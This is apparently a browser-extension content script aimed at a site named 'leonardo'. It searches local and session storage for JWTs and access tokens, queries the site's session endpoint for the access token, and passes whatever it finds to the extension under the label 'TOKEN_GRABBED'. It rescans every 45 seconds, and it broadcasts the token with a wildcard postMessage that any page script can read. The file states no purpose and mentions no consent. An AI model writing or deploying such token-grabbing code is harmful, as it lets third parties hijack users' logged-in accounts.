(function() {
  'use strict';
  var provider = 'leonardo';
  var lastPosted = '';
  function postIfChanged(t) {
    if (!t || t === lastPosted || t.length < 20) return;
    lastPosted = t;
    window.postMessage({ type: 'ARKX_TOKEN', provider: provider, token: t }, '*');
  }
  function checkStorage(storage) {
    for (var i = 0; i < storage.length; i++) {
      var key = storage.key(i);
      if (!key) continue;
      var val = storage.getItem(key);
      if (!val) continue;
      if (val.indexOf('eyJ') !== -1) return val;
      try {
        var parsed = JSON.parse(val);
        if (parsed && parsed.access_token) return parsed.access_token;
      } catch(e) {}
    }
    return null;
  }
  function rescan() {
    try {
      postIfChanged(checkStorage(localStorage) || checkStorage(sessionStorage));
    } catch(e) {}
    try {
      fetch('/api/auth/session').then(function(r) { return r.json(); }).then(function(data) {
        postIfChanged(data && (data.accessToken || data.access_token));
      }).catch(function() {});
    } catch(e) {}
  }
  rescan();
  setInterval(rescan, 45000);
  document.addEventListener('visibilitychange', function() { if (!document.hidden) rescan(); });
  window.addEventListener('message', function(event) {
    if (event.source !== window) return;
    if (event.data && event.data.type === 'ARKX_TOKEN' && event.data.provider === provider) {
      chrome.runtime.sendMessage({ type: 'TOKEN_GRABBED', provider: provider, token: event.data.token });
    }
  });
})();